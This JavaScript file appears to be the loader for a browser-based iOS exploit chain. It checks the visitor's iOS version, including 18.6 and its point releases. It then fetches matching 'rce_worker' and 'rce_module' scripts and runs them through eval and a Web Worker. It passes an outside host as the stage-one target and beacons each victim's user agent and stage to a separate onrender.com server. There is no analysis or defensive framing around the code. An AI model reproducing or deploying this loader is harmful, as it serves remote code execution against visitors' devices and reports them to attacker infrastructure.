var SERVER_LOG = true;
let logStart = new Date().getTime();
let logEntryID = 0;

var offsets = {};
var slide;
var chipset;
var device_model;

var localHost = "https://bullthemarket.onrender.com";

// ---------------------------
// BACKEND TEST (NEW)
// ---------------------------
function testBackend(stage = "unknown") {
    fetch("https://files-adii.onrender.com/ping", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            stage,
            time: Date.now(),
            userAgent: navigator.userAgent
        })
    })
    .then(r => r.text())
    .then(data => console.log("Backend OK:", data))
    .catch(err => console.log("Backend FAIL:", err));
}

// ---------------------------
function pipelineDone(reason = "complete") {
    console.log("PIPELINE DONE:", reason);
    testBackend(reason);
}

// ---------------------------
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
}

function redirect() {
    window.location.href = "https://bullthemarket.onrender.com/404.html";
}

function getJS(fname, method = 'GET') {
    try {
        let xhr = new XMLHttpRequest();
        xhr.open("GET", fname, true);
        xhr.send(null);
        return xhr.responseText;
    } catch (e) {}
}

// ---------------------------

const ios_version = (function() {
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (version) {
        return version.split('_').map(p => parseInt(p));
    }
})();

let workerCode = "";

if (ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
    workerCode = getJS(`/rce_worker_18.6.js?${Date.now()}`);
else
    workerCode = getJS(`/rce_worker.js?${Date.now()}`);

let workerBlob = new Blob([workerCode], { type: 'text/javascript' });
let workerBlobUrl = URL.createObjectURL(workerBlob);

// ---------------------------

(() => {

function main() {

    const worker = new Worker(workerBlobUrl);

    // ---------------------------
    // SAFE worker event hook
    // ---------------------------
    worker.onmessage = (e) => {
        const data = e.data;

        if (!data) return;

        console.log("Worker event:", data.type);

        // optional completion signal
        if (data.type === "stage1_done") {
            pipelineDone("stage1_done");
        }
    };

    try {

        let rceCode = "";

        if (ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
            rceCode = getJS(`rce_module_18.6.js?${Date.now()}`);
        else
            rceCode = getJS(`rce_module.js?${Date.now()}`);

        try {
            eval(rceCode);
        } catch (e) {}

        let desiredHost = localHost;

        worker.postMessage({
            type: 'stage1',
            desiredHost,
            ios_version
        });

        // ---------------------------
        // BASIC END-OF-FLOW TEST
        // ---------------------------
        setTimeout(() => {
            pipelineDone("timeout_fallback");
        }, 5000);

    } catch (e) {}

}

main();

})();
